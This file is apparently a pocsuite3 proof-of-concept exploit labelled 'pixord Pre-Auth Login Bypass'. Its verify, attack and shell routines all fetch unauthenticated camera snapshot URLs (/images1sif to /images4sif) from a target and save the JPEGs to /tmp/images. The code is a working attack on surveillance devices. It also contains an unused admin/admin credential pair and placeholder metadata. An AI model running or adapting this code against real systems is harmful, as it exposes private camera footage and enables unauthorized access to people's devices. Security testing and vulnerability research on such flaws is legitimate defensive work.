#!/usr/bin/env python3
# -*- coding: utf-8 -*-
import functools

from pocsuite3.api import (
    minimum_version_required, POCBase, register_poc, requests, logger,
    OptString, OrderedDict,
    random_str,
)
import requests
import os.path
from urllib.parse import urljoin, urlparse
minimum_version_required('1.9.11')


class DemoPOC(POCBase):
    vulID = '0'
    version = '1'
    author = ''
    vulDate = '2023-04-11'
    createDate = '2023-04-11'
    updateDate = '2023-04-11'
    references = []
    name = 'pixord Pre-Auth Login Bypass'
    appPowerLink = ''
    appName = ''
    appVersion = ''
    vulType = 'Login Bypass'
    desc = 'Vulnerability description'
    samples = ['']
    install_requires = ['']
    pocDesc = 'User manual of poc'
    dork = {'zoomeye': ''}
    suricata_request = ''
    suricata_response = ''


    # def _exploit(self, param=''):
    #
    #                 result = {"VerifyInfo":{"URL":snap_url}}
    #
    #     return self.parse_output(result)




    def _verify(self):
        creds = {
            "username": 'admin',
            "password": 'admin'
        }
        for n in range(1,5):
            snap_url = urljoin(self.url,f"/images{n}sif")
            res = requests.get(snap_url,verify=False)
            if (res.status_code == 200 and 'Content-Type' in res.headers) and res.headers['Content-Type'] == 'image/jpeg':
                parsed = urlparse(res.url)
                image_dir = f"/tmp/images"
                if not os.path.exists(image_dir):
                    os.makedirs(image_dir)
                filename = os.path.join(image_dir,f"{parsed.netloc.replace(':','_')}") + f'({n}).jpg'
                with open(filename,'wb') as f:
                    f.write(res.content)
                    logger.info(f'save snapshot to {filename}')
                result = {}
                param = ''
                result['VerifyInfo'] = {}
                result['VerifyInfo']['URL'] = snap_url
                result['VerifyInfo'][param] = ''
                return self.parse_output(result)

    def _attack(self):
        return self._verify()

    def _shell(self):
        return self._verify()


register_poc(DemoPOC)
